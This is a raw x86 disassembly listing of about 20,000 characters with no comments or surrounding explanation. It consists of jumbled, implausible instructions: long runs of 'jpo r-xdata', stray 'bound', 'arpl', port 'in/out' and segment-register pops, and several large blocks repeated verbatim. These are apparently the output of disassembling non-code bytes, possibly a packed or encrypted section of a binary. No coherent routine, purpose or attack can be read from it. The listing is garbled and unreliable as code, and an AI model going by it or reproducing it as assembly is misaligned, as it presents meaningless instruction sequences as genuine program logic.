sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
sub al 0xae
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
sub_46f8fa
jmp r-xdata
adc al 0x2
shl [ edi ] 0x1
adc al 0x14
jpo r-xdata
sti
or [ esp + edx ] dl
pushad
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
adc al 0xae
das
scasb [ edi ]
jpo r-xdata
mov ebp 0x2c8a9ca6
mov [ 0x2fae2c9d ] eax
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
pop esp
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub al 0xae
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
scasb [ edi ]
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
adc al 0x14
jpo r-xdata
in al 0x5c
mov ebp 0x17ae62bc
jpo r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
and dx [ esi ]
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x7b
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
0x7bebebe8 0x7b7b
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
outsb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x83
jecxz r-xdata
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
outsd
outsb
jmp r-xdata
add [ esi ] 0x10
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
sub_46f8fc
dec ebp
pop ss
adc al 0x14
add dl al
aaa
adc al 0x14
jpo r-xdata
sti
or [ esp + edx ] dl
pushad
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
adc al 0xae
das
scasb [ edi ]
jpo r-xdata
mov ebp 0x2c8a9ca6
mov [ 0x2fae2c9d ] eax
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
pop esp
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub al 0xae
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
scasb [ edi ]
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
adc al 0x14
jpo r-xdata
in al 0x5c
mov ebp 0x17ae62bc
jpo r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
and dx [ esi ]
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x7b
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
0x7bebebe8 0x7b7b
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
outsb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x83
jecxz r-xdata
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
outsd
outsb
jmp r-xdata
add [ esi ] 0x10
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
sub_46f92f
jpo r-xdata
jmp r-xdata
jb r-xdata
scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

jmp sub_46f920
sub_46fa0f
jmp r-xdata
out 0xeb al
jmp r-xdata
bound ebp [ esi - 0x717e4cc5 ]
lea esp [ edx - 0x52 ]
lea esp [ edx - 0x5a ]
aas
mov dl 0x81
xchg ebx eax
lea esp [ edx - 0x5a ]
cmp eax 0x8d8a81b2
bound esp [ esi - 0x737e4dcd ]
jpo r-xdata
lahf
iretd
jpo r-xdata
mov eax 0x14074902
adc al 0x7b
jpo r-xdata
add ebx [ esi ]
clc
jmp r-xdata
jecxz r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
in al 0x6e
pop esi
xor [ esp + edx ] dl
add al [ ebp + 0x30 ]
cmp [ ebx + 0x2028581 ] esi
and eax 0x7b7b1414
jpo r-xdata
scasb [ edi ]
push ss
mov esp 0x14eb81c7
jl r-xdata
xor [ edx + 0x628dc581 ] esi
cmpsb [ esi ] [ edi ]
aaa
cmpsb [ esi ] [ edi ]
xor esi [ edx + 0x628d8c81 ]
cmpsb [ esi ] [ edi ]
and ch [ esi + 0x2b ]
jpo r-xdata
jpo r-xdata
out 0xeb al
jmp r-xdata
sahf
jecxz r-xdata
bound ebp [ esi + 0x1150021f ]
adc al 0x14
scasb [ edi ]
add edi [ ebx + 0x14261e02 ]
adc al 0x14
sahf
sbb esp [ edx - 0x4a ]
and edi [ edx + eax + 0x14143ddc ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
fsub [ edx ]
jpo r-xdata
in eax dx
add bl [ esi ]
das
adc al 0x14
jpo r-xdata
xor [ esp + edx ] edx
jpo r-xdata
pop ds
jge r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xlat
loope r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub ah [ edx ]
sub [ ebx + 0x7b ] bh
outsb
sub esp esp
jb r-xdata
jpo r-xdata
adc al 0xbb
adc al 0x9e
aaa
add cl [ eax ]
and al 0x14
in al 0x6e
push ss
stc
jmp r-xdata
jpo r-xdata
jpo r-xdata
bound esi [ esi + 0x628db047 ]
mov dh 0x45
sbb [ eax + 0x55a6628d ] 0x29f81b2
bound esp [ edi ]
adc [ esp + edx ] dl
scasb [ edi ]
btc [ edx ] eax
pop ds
add dl [ esp + edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc edi 0xffffffe1
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x5a ]
add ch [ ebx + 0xf ]
jpo r-xdata
mov dl 0x8d
bound esp [ esi - 0x72dc9fcb ]
bound ebp [ esi + 0x22bd80f ]
mov [ ebp - 0x4dce599e ] cs
add ebp 0x37a6628d
pop ss
add eax [ edi + 0x3 ]
mov bl 0x62
scasb [ edi ]
enter 0x62b3 0xae
jpo r-xdata
sub esp esp
outsb
cli
mov esi 0x2ba0760
cmp [ eax ] ah
adc al 0x14
jpo r-xdata
in al 0x72
sub ah [ eax + 0x2a ]
and ch [ eax ]
jpo r-xdata
fsubr [ ebx ]
stosd [ edi ]
add ch [ esi + 0x11 ]
jpo r-xdata
adc al 0x9e
add eax [ edx ]
adc al 0x14
jpo r-xdata
xchg edi eax
iretd
bound esi [ esi - 0x72cf27f3 ]
bound esi [ esi + 0x2316003 ]
add al [ edx + 0x22 ]
adc al 0x14
add esi [ edx ]
outsb
outsd
push esi
adc al 0x14
fcom [ edx + edx * 8 ]
jpo r-xdata
cwde
jmp r-xdata
jpo r-xdata
add cl bl
add [ esp + edx ] edx
outsb
sub esp esp
outsd
int 0x1
adc al 0x14
fsubr [ ebx ]
stosd [ edi ]
bound edi [ esi - 0x419d723b ]
fild [ ecx + 0x628db192 ]
mov esi 0xb18f81d9
push ebp
mov dl 0x81
lahf
cmpsb [ esi ] [ edi ]
adc al 0x14
add esp [ ecx + 0x11 ]
adc al 0x14
mov dl 0xb2
outsb
push ss
adc al 0x14
bound ebp [ esi + 0x3470317 ]
jpo r-xdata
pushad
sub eax 0xebf81302
jmp r-xdata
in al 0x68
add al 0x3d
adc al 0x14
pushad
cmpsb [ esi ] [ edi ]
pop ss
push 0xa662ff2a
pop ss
add dh [ 0x7b14142f ]
add esp [ ecx ]
adc dl [ esp + edx ]
mov ebx 0xbb1fae66
scasb [ edi ]
sub eax [ edx ]
add al 0x14
adc al 0x7b
jpo r-xdata
lea esp [ edx - 0x5a ]
outsb
jpo r-xdata
sti
jmp r-xdata
add eax [ eax + 0x3d ]
adc al 0x14
add dl [ ebp + 0x7b141423 ]
call 0x49300da
lea esp [ edx - 0x42 ]
fild [ ecx + 0xc2a0289 ]
adc al 0x14
jpo r-xdata
xchg edx eax
mov cl 0x8d
bound edi [ esi - 0x4e707e27 ]
adc al 0x14
jpo r-xdata
imul ecx [ edi ] 0x14
adc al 0x7b
lea esp [ edx - 0x42 ]
lds ecx [ ebp - 0x7e24419e ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
fdivr [ 0x7b7b1414 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x52 ]
or eax 0x28581b3
add [ eax ] dh
mov esp edx
jmp r-xdata
lea esp [ edx - 0x4a ]
pop ecx
add dl [ ecx + edi + 0x14 ]
adc al 0x7b
mov eax 0x2039e14
cmp bh bl
adc al 0x14
jpo r-xdata
jpo r-xdata
fsubr [ ebx ]
add dl [ eax + 0x1f ]
adc al 0x14
jpo r-xdata
mov ebx 0x1401d302
adc al 0x81
lds esi [ edx - 0x141d63fe ]
jmp r-xdata
inc edi
add edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
pushad
sbb eax eax
sbb ch [ eax + 0x2a ]
jmp 0x34159b1
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ah 0x5
adc al 0x14
jpo r-xdata
pushad
and ecx [ ebp - 0x27f0519e ]
sub eax [ edx ]
jpo r-xdata
add bl [ edi ]
adc al 0x14
jpo r-xdata
add edx [ esp + edx ]
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
add ch [ ecx + 0x10 ]
adc al 0x14
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
0xbc14ebeb 0x14e3
push 0x1f83ff2f
lea esp [ edx - 0x52 ]
jpo r-xdata
pushad
xor cl [ ebp + 0x249b662 ]
or al 0x1f
adc al 0x14
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
popad
adc al 0x7b
add eax 0x7b14140b
jpo r-xdata
mov dh 0x3
pushad
xor [ edx ] eax
out 0xeb eax
jmp r-xdata
cmp al [ ebx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov bh 0xb8
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
mov dl 0x8d
bound esi [ esi + 0x39540259 ]
adc al 0x14
jpo r-xdata
outsb
add al 0x24
adc al 0x14
mov ebx 0x2379e14
or [ esp + edx ] ah
jpo r-xdata
jmp r-xdata
mov esi 0xbaba0760
add ch [ eax ]
in al 0xeb
jmp r-xdata
psubusb mm5 [ ebx ]
add dh [ ebp + eax + 0x7b7b1414 ]
scasb [ edi ]
cmp edx [ esi ]
adc al 0x14
mov ebx 0xe61d02b8
jmp r-xdata
outsb

lea esp [ edx - 0x4a ]
or esi [ eax + 0x628ddd81 ]
xchg esi eax
add esi [ ecx + eax * 4 - 0x419d7221 ]
lodsd [ esi ]
out 0x3 eax
xchg edx eax
xor edx [ esp + edx ]
and [ edx - 0x438ac7a0 ] 0x62
lodsd [ esi ]
sti
add eax [ eax + 0x68141433 ]
das
stosd [ edi ]
add cl [ ecx + 0x7b141435 ]
jpo r-xdata
bound ebp [ esi - 0x72d29fc1 ]
bound ebp [ esi - 0x72d79fc3 ]
bound ebp [ esi - 0x72d59fcd ]
bound ebp [ esi + 0x22d6031 ]
push eax
adc dl [ esp + edx ]
lea esp [ edx - 0x1d ]
sub [ ebx + 0x60 ] bh
pop es
mov edx 0x3bcbdb8
jpo r-xdata
sti
add ch [ edx ]
out 0xeb eax
jmp r-xdata
jpo r-xdata
sub ebx 0xffffffeb
adc al 0x7b
jpo r-xdata
fsubr [ ebx ]
mov ebp 0x17ae62bc
bound ebp [ esi + 0x13ae621f ]
add dl [ ecx ]
sub [ esp + edx ] edx
xor [ fs : esp + edx ] edx
lea ebp [ esi + 0x1d ]
in al 0x6e
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov bl 0x81
pushfd
lea esp [ edx - 0x52 ]
lar eax [ edi + 0xe ]
adc al 0x14
jpo r-xdata
sub cl [ edi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec esp
add al 0x14
adc al 0xd0
scasb [ edi ]
out 0xe4 eax
jpo r-xdata
mov ebp 0xfb3a03bb
bound ebp [ esi + 0x6fae6613 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
push ds
inc eax
cmp eax 0x95021414
and edx [ esp + edx ]
in al 0x5c
[ edx + 0x68549166 ]
adc al 0xf2
in al 0x6c
call 0x6932e9d1
sub ebx ecx
adc al 0x14
jpo r-xdata
pop edi
cmp [ esp + edx ] dl
jpo r-xdata
lea esp [ edx - 0x6a ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
shr [ esi + 0x1e6fe4e7 ] 0x1
jpo r-xdata
jpo r-xdata
sti
jpo r-xdata
outsb
sub esp esp
outsd
jpo r-xdata
mov [ ebx + 0x628d8f81 ] esi
scasb [ edi ]
add esi [ ebx + 0x628d8a81 ]
scasb [ edi ]
add [ ebx + 0x628d8c81 ] esi
scasb [ edi ]
outsb
and edx [ esi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
and [ edx ] eax
xchg esi eax
jpo r-xdata
adc [ ebp + 0x602b9662 ] cl
adc cl [ ebp + 0x60299662 ]
adc eax 0x2f96628d
lea esp [ edx - 0x52 ]
or esi [ ebx + 0x628d8e81 ]
scasb [ edi ]
or [ ebx + 0x628da281 ] esi
scasb [ edi ]
btr [ edx ] eax
neg [ edi ]
adc al 0x14
in al 0x6e
or [ fs : esp + edx ] dl
rcr [ edx ] 0x6f
jpo r-xdata
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ edi + ecx * 2 - 0x15 ]
adc esp [ esi - 0x52 ]
jpo r-xdata
pushad
pop es
mov edx 0xe42802ba
jmp r-xdata
and [ esp + edx ] 0x16010214
adc al 0x14
jpo r-xdata
in al 0x6f
pushad
xor [ ebp - 0x7eb4499e ] ecx
cwde
adc al 0xd8
xor [ edx ] al
push 0x34
mov esp 0x14267902
adc al 0x7b
jpo r-xdata
jpo r-xdata
add ch al
sti
jmp r-xdata
in al 0x6f
bound ebp [ esi - 0x3efd4cf9 ]
jpo r-xdata
push 0x1502e72f
xor eax 0x7b7b1414
jpo r-xdata
out dx eax
mov eax 0x6e66b8b8
imul edx [ esi ] 0x14
adc al 0xbb
mov eax 0x14181602
adc al 0x7b
lea esp [ edx - 0x52 ]
aas
pushad
sub eax 0x3dae628d
pushad
sub [ ebp + 0x6033ae62 ] cl
sub cl [ ebp + 0x6031ae62 ]
sub eax 0x14125002
adc al 0x8d
jpo r-xdata
mov eax 0xbcbd2bd8
bound ebp [ esi + 0x1fae6217 ]
bound ebp [ esi + 0x29110213 ]
adc al 0x14
jpo r-xdata
outsd
scasb [ edi ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov esp 0x7c141360
jmp r-xdata
adc al 0x14
adc al 0x14
fdiv [ eax ]
add ch [ edx + 0x34 ]
jpo r-xdata
pop es
mov bl 0x2
shl [ ebx ] 0x14
jpo r-xdata
jpo r-xdata
outsb
and al [ edx ]
bound eax [ ebx ]
adc al 0x14
add ah [ edx + 0x27 ]
mov dh 0x47
mov al 0x8d
bound esi [ esi - 0x72677ebb ]
bound esp [ esi - 0x607e4dab ]
outsb
sbb eax 0x31646ee4
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
cmp [ ebp + 0x14379802 ] 0x760be14
push 0x8981db07
mov bl 0x81
lea esp [ edx - 0x6a ]
sub [ eax + 0x15 ] esp
lea esp [ edx - 0x6a ]
das
pushad
pop es
mov edx 0x14d8bcba
mov esp 0x1439d202
adc al 0x7b
in al 0x6f
call 0x7c32eb6c
jpo r-xdata
pop es
aaa
adc al 0x14
lea ebp [ esi + 0x1d ]
add dh [ esi + 0x7b14140f ]
jpo r-xdata
jpo r-xdata
add bh [ ecx + 0x26 ]
adc al 0x14
jpo r-xdata
and edx [ esp + edx ]
jpo r-xdata
add al cl
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ss [ edx ]
jpo r-xdata
add bh bl
jpo r-xdata
jpo r-xdata
jpo r-xdata
and edx [ esp + edx ]
jpo r-xdata
adc al 0x2
jpo r-xdata
jpo r-xdata
jpo r-xdata
call 0xffffffffe516cfbe
pop esp
sub edi [ ebx - 0x14fcd2a0 ]
sbb dl [ esp + edx ]
push 0xaf62e72f
iretd
pushad
mov esi 0xbaba0760
mov esp 0x2bc14d8
sar [ ecx ] cl
adc al 0x14
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov ss [ esp + edx + 0x14 ]
add bh [ edx - 0x1e ]
jmp r-xdata
add ecx [ esi + 0x68141412 ]
das
out 0x6e eax
sub esp esp
outsd
adc al 0x14
push 0x2b6ee72f
in al 0x6f
jpo r-xdata
jpo r-xdata
mov eax [ 0x2141407 ]
outsd
rcr bh cl
cli
in al 0x6e
in eax 0xeb
jmp r-xdata
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound edi [ esi - 0x72c59fcd ]
bound edi [ esi - 0x257e4ecf ]
add ah [ ebp + 0x7b141431 ]
bound esp [ esi - 0x519d72b3 ]
mov dl 0x1c
jpo r-xdata
sbb [ esp + edx ] edx
adc al 0x7b
jpo r-xdata
sub esi [ edx - 0x38fdcce4 ]
jpo r-xdata
adc al 0x9e
unpcklps xmm7 [ ebx ]
sub edi 0xebdbeb83
jmp r-xdata
jpo r-xdata
scasb [ edi ]
adc edi [ ebx + 0x50022d60 ]
aaa
adc al 0x14
jpo r-xdata
jmp r-xdata
xor eax [ edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc ebp
pushad
and eax 0xebe67702
jmp r-xdata
lea esp [ edx - 0x52 ]
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
sbb al 0x33
jpo r-xdata
jpo r-xdata
test eax 0x31360bd
jpo r-xdata
sbb eax 0xae661414
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
outsd
jmp r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
or ebx 0x33be628d
pushad
cmp cl [ ebp - 0x4ece419e ]
sbb edx 0x1431a502
adc al 0x7b
add al bh
jpo r-xdata
adc al 0x14
mov ebx 0x6083bd14
scasb [ edi ]
out 0xd0 eax
sub [ edx ] al
cdq
jmp r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
test al 0x3f
pushad
jpo r-xdata
jmp r-xdata
sti
adc al 0x66
jpo r-xdata
jpo r-xdata
outsb
sbb eax 0x31186fe4
jpo r-xdata
adc al 0x7d
inc edi
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
ja r-xdata
outsb
mov dh 0x11
jpo r-xdata
mov eax 0xeb477d14
jmp r-xdata
mov ebx 0x16236e66
jpo r-xdata
mov ebx 0xebe7f903
jmp r-xdata
adc al 0x9e
pop ds
jpo r-xdata
adc al 0x7b
jpo r-xdata
add ebp [ eax + 0x214143f ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
pushad
pop es
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] edx
jpo r-xdata
bound ebp [ esi - 0x62fd4cf5 ]
adc al 0x14
jpo r-xdata
jecxz r-xdata
adc [ esp + edx ] edx
cmp [ edx ] eax
inc ebx
jmp r-xdata
pushad
adc edx [ esp + edi * 2 ]
jpo r-xdata
jpo r-xdata
in al 0x6f
sub esp [ edx ]
adc al 0x14
add dh [ eax - 0x1e ]
jmp r-xdata
add bl [ esi + 0x14ebebeb ]
sahf
pop ss
xor [ esp + edx ] edx
lodsd [ esi ]
mov eax [ ebx ]
fstp [ edi ]
adc al 0x14
adc [ edi - 0x437e7346 ] 0x62
adc al 0x14
aas
jpo r-xdata
add cl [ ebx ]
sub al 0x14
add esp [ eax ]
mov ebx 0xe9ebed83
jpo r-xdata
fsubr [ ebx ]
push 0x6d62f32f
pop ds
jpo r-xdata
jg r-xdata
jpo r-xdata
push 0x2ebe796
adc [ edx ] eax
adc al 0x14
jpo r-xdata
fucomi st6
jpo r-xdata
scasb [ edi ]
jpo r-xdata
out dx eax
jmp r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
add ch [ esi + 0x7b14142e ]
jpo r-xdata
adc al 0xbc
lahf
add bh cl
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
bound edx [ esi + 0x31040205 ]
or ebp [ esp + edx ]
adc al 0x2
jpo r-xdata
in eax dx
jpo r-xdata
jmp r-xdata
adc al 0x68
or edi [ ecx ]
bound ebp [ ebp + 0x1f ]
jpo r-xdata
adc [ ebx - 0x72537e4f ] 0xb171be62
jpo r-xdata
scasb [ edi ]
pop ss
mov ebx 0x13683c14
0x26f06ee4 0x1414
jpo r-xdata
out 0xeb eax
jpo r-xdata
jpo r-xdata
xor [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
in al dx
jmp r-xdata
mov bl 0x2
jpo r-xdata
cmpsb [ esi ] [ edi ]
dec ebp
pushad
stosd [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax 0xbe7b1414
pushad
pop es
push 0x7
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
and [ 0xffffffffae661414 ] bl
jpo r-xdata
jmp 0xffffffffe84c04fa
jpo r-xdata
adc al 0x14
push edi
xor [ eax + 0x56 ] al
or esi [ ebx - 0x141362fe ]
jmp r-xdata
jpo r-xdata
sub ebp 0xffffffeb
jpo r-xdata
add dl [ ecx ]
add dl [ esp + edx ]
pushad
xor al 0x38
adc [ eax + 0x2d ] ch
jecxz r-xdata
adc al 0x7b
jpo r-xdata
popfd
fsubr [ ebx ]
add ch [ ecx + eax + 0x7b7b1414 ]
mov ebp 0xe42b6ea7
jpo r-xdata
adc al 0x7b
lds edx [ esp + edx ]
jpo r-xdata
adc al 0xbb
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub eax [ edx ]
xchg edi eax
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0x63 eax
mov ebp 0xa8031360
jpo r-xdata
add al [ 0x7bebebe8 ]
jpo r-xdata
jpo r-xdata
add bl [ ebp + 0x60ebebec ]
scasd [ edi ]
iretd
jpo r-xdata
jmp r-xdata
jpo r-xdata
arpl [ edi + 0x15684cfe ] si

jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov esp 0x135f6e66
jmp r-xdata
outsd
outsb
sub esp esp
jpo r-xdata
adc al 0x14
jpo r-xdata
shr [ eax ] 0x1
jpo r-xdata
mov eax 0x142efc02
jpo r-xdata
outsd
push 0x2141422
jpo r-xdata
adc al 0x14
jpo r-xdata
loop r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
mov edi 0xb8ebebe2
mov ebp 0x541b60bc
out dx eax
0x66bcebeb 0x5f6e
inc esp
add eax 0x7b7b1414
adc eax [ ebx ]
jpo r-xdata
mov [ ecx - 0x70529d44 ] es
add dl dl
adc al 0x14
